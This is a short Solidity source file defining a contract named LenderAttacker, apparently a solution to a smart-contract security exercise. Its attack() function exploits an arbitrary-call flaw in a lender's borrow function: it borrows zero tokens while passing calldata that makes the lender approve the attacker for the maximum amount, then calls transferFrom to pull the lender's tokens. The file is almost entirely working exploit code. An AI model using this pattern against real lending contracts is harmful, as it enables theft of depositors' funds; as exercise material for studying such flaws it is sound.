//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface ILender {
    function deposit(uint256 amount) external;

    function borrow(
        uint256 amount,
        address target,
        address borrower,
        bytes calldata data
    ) external;
}

interface IERC721 {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external;
}

contract LenderAttacker {
    ILender public lender;
    IERC20 public token;

    constructor(address _token, address _lender) {
        token = IERC20(_token);
        lender = ILender(_lender);
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        lender.borrow(0, address(token), address(this), data);
        token.transferFrom(address(lender), address(this), type(uint256).max);
    }
}
